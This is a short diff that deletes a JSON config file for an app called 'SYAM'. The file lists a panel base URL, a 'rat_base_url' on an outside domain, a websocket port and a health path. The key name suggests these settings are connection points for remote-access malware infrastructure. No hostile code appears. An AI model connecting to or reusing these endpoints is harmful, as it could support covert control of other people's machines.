@@ -1,8 +1,0 @@
-{
-  "app_name": "SYAM",
-  "version": "1.0.0",
-  "base_url": "https://boolpanel.daiyat19.my.id",
-  "rat_base_url": "https://syam.otax.fun/rat",
-  "ws_port": 25565,
-  "health_path": "/health"
-}
